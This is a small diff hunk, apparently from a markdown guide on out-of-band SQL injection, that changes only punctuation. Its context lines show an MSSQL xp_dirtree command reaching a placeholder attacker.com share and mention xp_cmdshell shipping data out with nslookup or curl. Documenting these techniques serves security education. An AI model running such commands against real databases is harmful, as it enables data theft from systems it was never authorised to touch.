@@ -311,7 +311,7 @@ This builds a UNC path like `\\webapp_db.attacker.com\share`; on Windows-based M
 
 ### MSSQL techniques
 - **`xp_dirtree`** triggers a DNS lookup by trying to list a remote directory: `EXEC master..xp_dirtree '\\attacker.com\share';` : enabled by default, commonly usable.
-- **`xp_cmdshell`** (if enabled) runs OS commands directly, e.g. triggering `nslookup` or `curl` to ship data out — disabled by default in modern MSSQL.
+- **`xp_cmdshell`** (if enabled) runs OS commands directly, e.g. triggering `nslookup` or `curl` to ship data out, disabled by default in modern MSSQL.
 
 ### Receiving the data
 Something has to be listening for the callback:
